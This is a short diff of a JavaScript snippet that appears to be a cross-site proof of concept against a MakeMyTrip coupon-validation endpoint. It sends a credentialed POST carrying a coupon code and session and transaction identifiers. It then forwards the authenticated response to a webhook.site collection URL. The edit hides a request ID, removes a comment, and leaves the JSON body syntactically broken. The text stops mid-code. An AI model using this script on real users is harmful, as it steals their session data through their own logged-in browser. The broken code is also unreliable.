@@ -1,13 +1,13 @@
 <script>
-fetch("https://mapi.makemytrip.com/clientbackend/cg/validate-coupon/DESKTOP/2?language=eng&region=in&currency=INR&idContext=B2C&countryCode=IN&requestId=1635a106-b63b-4c0c-a233-c493d61c876f", {
+fetch("https://mapi.makemytrip.com/clientbackend/cg/validate-coupon/DESKTOP/2?language=eng&region=in&currency=INR&idContext=B2C&countryCode=IN&requestId=...", {
   method: "POST",
   credentials: "include",
   headers: {
     "Content-Type": "application/json"
   },
-  body: JSON.stringify({"countryCode":"IN","txnKey":"cc8074a2-884a-455b-a381-0c1ada81dd0a","couponCode":"MMTMYCASH","removeCoupon":false,"userLocation":{"city":"CTKABA","state":"STTUNI","country":"TUN"},"requestDetails":{"journeyId":"18735756049e6da3d9-7e5a-47da-bb5b-08abf535d91a","requestId":"1635a106-b63b-4c0c-a233-c493d61c876f","sessionId":"f6792ed6-55c1-4dcc-a771-d8a4a613c676"}})
+  body: JSON.stringify({
+    {"countryCode":"IN","txnKey":"cc8074a2-884a-455b-a381-0c1ada81dd0a","couponCode":"MMTMYCASH","removeCoupon":false,"userLocation":{"city":"CTKABA","state":"STTUNI","country":"TUN"},"requestDetails":{"journeyId":"18735756049e6da3d9-7e5a-47da-bb5b-08abf535d91a","requestId":"1635a106-b63b-4c0c-a233-c493d61c876f","sessionId":"f6792ed6-55c1-4dcc-a771-d8a4a613c676"}})
 }).then(r => r.text()).then(data => {
-  // Send response back to you
   fetch("https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8", {
     method: "POST",
     body: data
